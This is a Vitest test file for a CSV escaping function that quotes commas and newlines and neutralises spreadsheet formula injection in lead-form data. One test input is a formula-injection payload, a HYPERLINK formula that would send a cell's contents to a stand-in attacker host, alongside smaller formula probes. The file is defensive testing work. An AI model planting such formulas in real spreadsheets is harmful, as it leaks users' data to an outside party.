import { describe, expect, it } from "vitest";

import { csvEscape } from "@/lib/format/csv";

describe("csvEscape", () => {
  it("leaves ordinary text alone", () => {
    expect(csvEscape("Anjali Menon")).toBe("Anjali Menon");
    expect(csvEscape("Kochi")).toBe("Kochi");
    expect(csvEscape("")).toBe("");
  });

  it("quotes commas, quotes and newlines", () => {
    expect(csvEscape("Menon, Anjali")).toBe('"Menon, Anjali"');
    expect(csvEscape('She said "yes"')).toBe('"She said ""yes"""');
    expect(csvEscape("line one\nline two")).toBe('"line one\nline two"');
  });

  it("neutralises a formula a lead-ad form could have submitted", () => {
    // The real scenario: this text arrives through the public Meta or
    // Google lead form and is opened in Excel by a counsellor.
    expect(csvEscape('=HYPERLINK("http://evil.example/"&A1,"click")')).toBe(
      '"\'=HYPERLINK(""http://evil.example/""&A1,""click"")"',
    );
    expect(csvEscape("=1+1")).toBe("'=1+1");
    expect(csvEscape("+91 9847012345")).toBe("'+91 9847012345");
    expect(csvEscape("-2")).toBe("'-2");
    expect(csvEscape("@SUM(A1:A9)")).toBe("'@SUM(A1:A9)");
  });

  it("guards before quoting, so a formula containing a comma is still literal", () => {
    // Order matters: quote first and the apostrophe would land inside the
    // quotes in the wrong place, or not at all.
    expect(csvEscape("=A1,B1")).toBe("\"'=A1,B1\"");
  });

  it("catches a tab used to smuggle a leading =", () => {
    // A tab needs no CSV quoting — only the apostrophe matters here.
    expect(csvEscape("\t=1+1")).toBe("'\t=1+1");
  });

  it("does not touch a formula character that is not first", () => {
    expect(csvEscape("Sree=Narayana School")).toBe("Sree=Narayana School");
  });
});
